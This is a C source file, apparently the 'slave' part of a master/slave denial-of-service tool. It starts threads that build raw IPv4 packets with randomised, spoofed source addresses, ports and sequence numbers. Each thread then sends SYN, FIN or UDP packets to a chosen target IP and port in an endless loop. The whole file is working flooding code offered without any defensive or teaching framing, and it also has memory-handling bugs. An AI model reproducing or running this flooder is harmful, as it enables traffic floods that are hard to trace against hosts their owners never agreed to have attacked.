#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h> // close()
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#include "slave.h"
#include "checksum.h"

#define UDP_PAYLOAD 1000

#define PTHREAD_FREE(ID)  do{ if( pthread_cancel((ID)) != 0 ) { perror("pthread_cancel()"); return false; } }while(0)

static struct SlaveTable head;

static void *startup(void *dst);
static struct SlaveTable *alloc_slave(struct Flow *flow, pthread_t *tid);

void rawprint(uint8_t *packet, int len)
{
	int i = 0;
	printf("------- RAW -------\n");
	while( i < len ) {
		printf("%02x ", *(packet+i));
		if( ++i%16 == 0 ) printf("\n");
	}
	if( i%16 != 0 ) printf("\n-------------------\n");
	else printf("-------------------\n");
}

bool slave_create(struct Flow *flow)
{
	struct SlaveTable *node = &head;
	int times = flow->times;
	pthread_t slave[times];
	pthread_attr_t attr;
	int i;

	while( node->next != NULL ) {
		node = node->next;
		if( memcmp(&node->flow, flow, sizeof(struct Flow)) == 0 ) {
			printf("Already Running\n");
			return false;
		}
	}

	pthread_attr_init(&attr);
	pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

//	printf("--- crreate\n");
//	printf("%p / %p / %p / %p\n", &flow->ip, &flow->port, &flow->times, &flow->type);
//	printf("%s / %d / %d / %d\n", inet_ntoa(flow->ip), flow->port, flow->times, flow->type);
	for(i = 0; i < times; i++) {
		if( pthread_create(&slave[i], &attr, startup, (void *)flow) != 0 ) {
			perror("slave_create()/pthread_create()");

			while( i-- > 0 )
				PTHREAD_FREE(slave[i]);

			return false;
		}
	}

	node->next = alloc_slave(flow, slave);
	if( node->next == NULL) {
		for(i = 0; i < times; i++)
			PTHREAD_FREE(slave[i]);

		return false;
	}
//	printf("%p -> %p\n", &head, head.next);
//	printf("%s / %d / %d / %d // %p / %p\n", inet_ntoa(node->next->flow.ip), node->next->flow.port, node->next->flow.times, node->next->flow.type, node->next->tid, node->next->next);

	return true;
}

bool slave_delete(struct Flow flow)
{
	struct SlaveTable *tmp, *node = &head;
	int times, i;

	while( node->next != NULL ) {
		if( memcmp(&flow, &node->next->flow, sizeof(struct Flow)) == 0 ) {
			tmp = node->next;
			times = tmp->flow.times;

			for(i = 0; i < times; i++) {
				PTHREAD_FREE(tmp->tid[i]);
				/*
				if( pthread_cancel(tmp->tid[i]) != 0 ) {
					perror("pthread_cancel(): ");
					return false;
				}
				*/
			}

			node->next = tmp->next;

			free(tmp->tid);
			free(tmp);

			return true;
		}

		node = node->next;
	}

	return false;
}

static void *startup(void *data)
{
	uint8_t packet[IP_MAXPACKET];
	struct Flow *flow = (struct Flow *)data;
	struct ip *iphdr = (struct ip *)packet;
	struct tcphdr *tcphdr = (struct tcphdr *)((uint8_t *)iphdr + sizeof(struct ip));
	struct udphdr *udphdr = (struct udphdr *)((uint8_t *)iphdr + sizeof(struct ip));
	char *payload;

	int iphdrlen = sizeof(struct ip);
	int packetlen = 0;
	int payloadlen = 0;

	int sockfd = 0;
	struct sockaddr_in din;
	int one = 1;
//	const int *val = &one;
//	printf("---- startup\n");
//	printf("%p / %p / %p / %p\n", &flow->ip, &flow->port, &flow->times, &flow->type);
//	printf("%s / %d / %d / %d\n", inet_ntoa(flow->ip), flow->port, flow->times, flow->type);

	memset(packet, 0, IP_MAXPACKET);

	/* IP HEADER */
	iphdr->ip_hl = iphdrlen / sizeof(uint32_t); // 5
	iphdr->ip_v = 4;
	iphdr->ip_ttl = 128;
	iphdr->ip_dst.s_addr = flow->ip.s_addr;

	packetlen += sizeof(struct ip);  // 20 bytes

	if( flow->type == UDP ) {
	/* UDP HEADER */
		printf("UDP\n");
		iphdr->ip_p = IPPROTO_UDP;

		payload = (char *)udphdr + sizeof(struct udphdr);
		payloadlen = UDP_PAYLOAD;

		udphdr->len = htons(sizeof(struct udphdr)+ payloadlen);
		udphdr->dest = htons(flow->port);

		packetlen += sizeof(struct udphdr) + payloadlen;

	}else {
	/* TCP HEADER */
		payload = (char *)tcphdr + sizeof(struct tcphdr);

		iphdr->ip_p = IPPROTO_TCP;
		tcphdr->dest = htons(flow->port);
		tcphdr->doff = sizeof(struct tcphdr)/ 4;  // 5
		tcphdr->window = htons(8192);
		tcphdr->rst = tcphdr->psh = tcphdr->ack = tcphdr->urg = 0;

		if( flow->type == SYN ) {
			printf("SYN\n");
			//payload = 05 b4 01 01 04 02
			memcpy(payload, "\x05\xb4\x01\x01\x04\x02", 6);
			payloadlen = 6;

			iphdr->ip_len = htons(iphdrlen + sizeof(struct tcphdr) + 6);
			tcphdr->syn = 1;
		}else {
			printf("FIN\n");
			//payload = 0
			iphdr->ip_len = htons(iphdrlen + sizeof(struct tcphdr));
			tcphdr->fin = 1;
		}

		packetlen += sizeof(struct tcphdr) + payloadlen;
	}

	/* PACKET */
	if( (sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0 ) {
		perror("startup()/socket()");
		printf("[%lu] EXIT\n", pthread_self());
		return NULL;
	}

	// Address family
	din.sin_family      = AF_INET;
	din.sin_addr.s_addr = flow->ip.s_addr;
	din.sin_port        = htons(flow->port);

	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
		perror("startup()/setsockopt()");
		printf("[%lu] EXIT\n", pthread_self());
		return NULL;
	}

	/* SEND PACKET */
	srand(time(NULL) + pthread_self());

	while( 1 ) {
		iphdr->ip_src.s_addr = rand();
		iphdr->ip_id = rand();
		iphdr->ip_sum = 0;
		iphdr->ip_sum = checksum((uint16_t *)iphdr, iphdrlen);

		if( flow->type == UDP ) {
			udphdr->source = rand();
			udphdr->check = 0;
			udphdr->check = udp_checksum(iphdr, udphdr, payload, payloadlen);

		}else {
			tcphdr->source = rand();
			tcphdr->seq = rand();
			tcphdr->ack_seq = rand();
			tcphdr->check = 0;
			tcphdr->check = tcp_checksum(iphdr, tcphdr, payload, payloadlen);
		}

		if( sendto(sockfd, packet, packetlen, 0, (struct sockaddr *)&din, sizeof(struct sockaddr)) < 0 ) {
			perror("startup()/sendto()");
		}

		rawprint(packet, packetlen);
		printf("IP %s\n", inet_ntoa(flow->ip));
		sleep(1);
	}

	close(sockfd);
}

static struct SlaveTable *alloc_slave(struct Flow *flow, pthread_t *tid)
{
//	printf("--- alloc\n");
//	printf("%p / %p / %p / %p\n", &flow->ip, &flow->port, &flow->times, &flow->type);
//	printf("%s / %d / %d / %d\n", inet_ntoa(flow->ip), flow->port, flow->times, flow->type);

	struct SlaveTable *tmp = (struct SlaveTable *)malloc(sizeof(struct SlaveTable));
	if( tmp == NULL ) {
		perror("alloc_slave()/malloc()");
		return NULL;
	}

	tmp->tid = (pthread_t *)malloc(flow->times);
	if( tmp->tid == NULL ) {
		perror("alloc_slave()/malloc()");
		free(tmp);
		return NULL;
	}

	memcpy(tmp, flow, sizeof(struct Flow));
	memcpy(tmp->tid, tid, flow->times * sizeof(pthread_t));
	tmp->next = NULL;

	return tmp;
}
